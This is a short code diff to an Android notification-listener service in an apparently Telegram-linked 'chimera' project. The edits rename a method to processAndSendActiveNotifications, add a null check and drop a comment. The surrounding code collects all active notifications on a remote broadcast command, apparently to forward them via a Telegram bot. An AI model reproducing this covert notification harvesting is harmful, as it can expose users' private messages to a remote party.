@@ -21,7 +21,7 @@ public class NotificationListener extends NotificationListenerService {
             @Override
             public void onReceive(Context context, Intent intent) {
                 if ("com.chimera.GET_ACTIVE_NOTIFICATIONS".equals(intent.getAction())) {
-                    getActiveNotifications();
+                    processAndSendActiveNotifications();
                 }
             }
         };
@@ -31,7 +31,9 @@ public class NotificationListener extends NotificationListenerService {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        unregisterReceiver(notificationCommandReceiver);
+        if (notificationCommandReceiver != null) {
+            unregisterReceiver(notificationCommandReceiver);
+        }
     }
 
     @Override
@@ -40,7 +42,7 @@ public class NotificationListener extends NotificationListenerService {
         String packageName = sbn.getPackageName();
 
         if (CLIPBOARD_PACKAGE.equals(packageName)) {
-            return; // Explicitly ignore clipboard notifications
+            return;
         }
 
         String filter = TelegramBotWorker.getNotificationFilter();
@@ -49,7 +51,7 @@ public class NotificationListener extends NotificationListenerService {
         }
     }
 
-    private void getActiveNotifications() {
+    private void processAndSendActiveNotifications() {
         try {
             StatusBarNotification[] activeNotifications = getActiveNotifications();
             if (activeNotifications == null || activeNotifications.length == 0) {
